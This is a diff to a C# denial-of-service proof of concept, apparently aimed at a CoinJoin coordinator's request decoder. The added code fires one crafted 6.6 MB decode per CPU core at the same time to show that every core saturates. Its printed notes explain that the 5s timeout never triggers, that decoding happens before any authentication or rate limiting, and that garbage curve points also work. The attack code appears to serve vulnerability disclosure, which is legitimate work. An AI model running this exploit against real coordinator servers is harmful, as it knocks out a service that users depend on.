@@ -76,6 +76,27 @@ class DosPoc
             Console.WriteLine($"  PublicNonces={n,8}  body={bodyBytes / (1024.0 * 1024):F1} MB  decode={ms / 1000:F2} s  materialized={ok}");
         }
 
+        // Concurrency: N simultaneous decodes finish in ~the same wall time as one,
+        // i.e. each pins a separate core -> one client with N connections exhausts N cores.
+        int cores = Environment.ProcessorCount;
+        Console.WriteLine($"\nConcurrency demo ({cores} logical cores): {cores} simultaneous 6.6MB decodes");
+        var body100k = Encoding.UTF8.GetBytes(Body(100_000));
+        var swc = Stopwatch.StartNew();
+        var tasks = new Task[cores];
+        for (int i = 0; i < cores; i++)
+            tasks[i] = Task.Run(async () =>
+            {
+                using var s = new MemoryStream(body100k);
+                await Decode.CoordinatorMessageFromStreamAsync(s, typeof(ConnectionConfirmationRequest));
+            });
+        await Task.WhenAll(tasks);
+        swc.Stop();
+        Console.WriteLine($"  {cores} concurrent decodes wall-clock: {swc.Elapsed.TotalSeconds:F2} s " +
+                          $"(~{cores * 1.06:F1} CPU-s of work) -> all cores saturated in parallel");
+
+        Console.WriteLine("\nNote: a 5s RequestTimeout policy exists but does NOT help -- a 30MB body decodes");
+        Console.WriteLine("in ~4.2s (< 5s, never triggered), and the synchronous decode loop observes no");
+        Console.WriteLine("cancellation token, so the CPU is spent regardless.");
         Console.WriteLine("\nAll of this runs in the input formatter BEFORE ConfirmConnectionAsync validates");
         Console.WriteLine("the AliceId/round. No auth, no UTXO, no rate-limit at this layer; body cap is the");
         Console.WriteLine("Kestrel default (~30 MB). Attacker can send garbage points too (failed on-curve");
